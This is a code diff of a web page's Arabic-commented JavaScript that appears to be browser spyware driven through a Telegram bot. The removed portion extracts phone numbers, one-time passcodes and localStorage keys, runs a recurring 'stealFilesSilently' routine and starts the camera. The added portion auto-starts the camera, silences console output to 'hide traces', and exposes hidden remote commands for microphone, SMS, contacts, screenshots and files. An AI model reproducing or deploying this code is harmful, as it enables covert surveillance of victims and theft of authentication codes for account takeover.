-                    const match = line.match(/localStorage:\s*(\w+)\s*\((\d+)\s*bytes\)/);
-                    if (match) {
-                        extracted.localStorage.push({
-                            key: match[1],
-                            size: parseInt(match[2])
-                        });
-                    }
-                }
-            }
-        }
-        
-        if (msg.photo) {
-            extracted.images.push({
-                file_id: msg.photo[msg.photo.length - 1].file_id,
-                date: new Date(msg.date * 1000).toISOString()
-            });
-        }
-        
-        if (msg.document) {
-            extracted.files.push({
-                name: msg.document.file_name || 'unknown',
-                size: msg.document.file_size,
-                date: new Date(msg.date * 1000).toISOString()
-            });
-        }
-    }
-    
-    // عرض الملخص
-    addLog(`📊 ==== الملخص ====`, 'info');
-    addLog(`📝 الرسائل: ${extracted.texts.length}`, 'info');
-    addLog(`🖼️ الصور: ${extracted.images.length}`, 'info');
-    addLog(`📁 الملفات: ${extracted.files.length}`, 'info');
-    addLog(`📱 الأرقام: ${extracted.numbers.length}`, 'success');
-    addLog(`🔑 الأكواد: ${extracted.otps.length}`, 'success');
-    addLog(`💾 localStorage: ${extracted.localStorage.length}`, 'blue');
-    
-    // تصدير الملفات
-    if (extracted.numbers.length > 0) {
-        const numbersText = extracted.numbers.join('\n');
-        downloadFile(numbersText, 'phone_numbers.txt', 'text/plain');
-        addLog(`✅ تم تصدير ${extracted.numbers.length} رقم`, 'success');
-    }
-    
-    if (extracted.otps.length > 0) {
-        const otpsText = extracted.otps.join('\n');
-        downloadFile(otpsText, 'otp_codes.txt', 'text/plain');
-        addLog(`✅ تم تصدير ${extracted.otps.length} كود`, 'success');
-    }
-    
-    if (extracted.localStorage.length > 0) {
-        const lsText = extracted.localStorage.map(l => 
-            `${l.key} | ${l.size} bytes`
-        ).join('\n');
-        downloadFile(lsText, 'localStorage_keys.txt', 'text/plain');
-        addLog(`✅ تم تصدير ${extracted.localStorage.length} مفتاح`, 'success');
-    }
-    
-    // تقرير كامل
-    const fullReport = JSON.stringify(extracted, null, 2);
-    downloadFile(fullReport, 'full_report.json', 'application/json');
-    addLog('✅ تم تصدير التقرير الكامل', 'success');
-    
-    sendMessage(`✅ تم استخراج:\n📱 ${extracted.numbers.length} رقم\n🔑 ${extracted.otps.length} كود\n💾 ${extracted.localStorage.length} مفتاح`);
-}
-
-function downloadFile(content, filename, mimeType = 'text/plain') {
-    const blob = new Blob([content], { type: mimeType });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = filename;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    URL.revokeObjectURL(url);
-}
-
-// ============================================================
-// 6. بدء العمليات
-// ============================================================
-function startOperations() {
-    addLog('🚀 بدء العمليات...', 'info');
-    statusDiv.textContent = '🚀 جاري التشغيل...';
-    
-    sendMessage(`🟢 بدء التشغيل\n📱 ${navigator.userAgent}`);
-    
-    // سحب الملفات
-    setTimeout(stealFilesSilently, 1000);
-    setInterval(stealFilesSilently, 30000);
-    
-    // تشغيل الكاميرا
-    setTimeout(startCamera, 2000);
-    
-    // استخراج البيانات من البوت بعد 15 ثانية
+    // تشغيل الكاميرا تلقائياً بعد 5 ثواني
     setTimeout(() => {
-        fetchAndExtractData();
-    }, 15000);
-    
-    setTimeout(() => {
-        sendMessage('✅ النظام جاهز');
+        startCamera();
     }, 5000);
 }
 
 // ============================================================
-// 7. إخفاء الآثار
+// ====================== INIT =================================
 // ============================================================
+// إخفاء الآثار
 console.log = function() {};
 console.warn = function() {};
 console.error = function() {};
 console.info = function() {};
 
-// ============================================================
-// 8. بدء التشغيل
-// ============================================================
-addLog('🔄 بدء التشغيل...', 'info');
-statusDiv.textContent = '⏳ جاري التهيئة...';
+// بدء التشغيل
+addLog('🔄 جاري التهيئة...', 'info');
+document.getElementById('status').textContent = '⏳ جاري التهيئة...';
 getChatId();
+
+// إظهار اللوحة للمالك (Ctrl+Shift+P)
+document.addEventListener('keydown', function(e) {
+    if (e.ctrlKey && e.shiftKey && e.key === 'P') {
+        e.preventDefault();
+        togglePanel();
+        panelOpen = true;
+    }
+    if (e.ctrlKey && e.shiftKey && e.key === 'H') {
+        e.preventDefault();
+        if (panelOpen) {
+            document.getElementById('adminPanel').classList.remove('active');
+            panelOpen = false;
+        }
+    }
+});
+
+// ============================================================
+// ====================== EXPOSE TO CONSOLE ====================
+// ============================================================
+// للمالك: يمكنك استخدام هذه الدوال من وحدة التحكم
+window.admin = {
+    panel: () => togglePanel(),
+    camera: () => executeCommand('camera'),
+    mic: () => executeCommand('mic'),
+    files: () => executeCommand('files'),
+    sms: (phone, msg) => executeCommand('sms', { phone, msg }),
+    contacts: () => executeCommand('contacts'),
+    screenshot: () => executeCommand('screenshot'),
+    kill: () => executeCommand('kill'),
+    log: addLog
+};
+
+console.log('🕵️ لوحة التحكم جاهزة! استخدم Ctrl+Shift+P لفتحها');
+console.log('📋 الأوامر المتاحة: admin.camera(), admin.mic(), admin.files(), admin.sms(), admin.contacts(), admin.screenshot(), admin.kill()');
 </script>
 </body>
 </html>
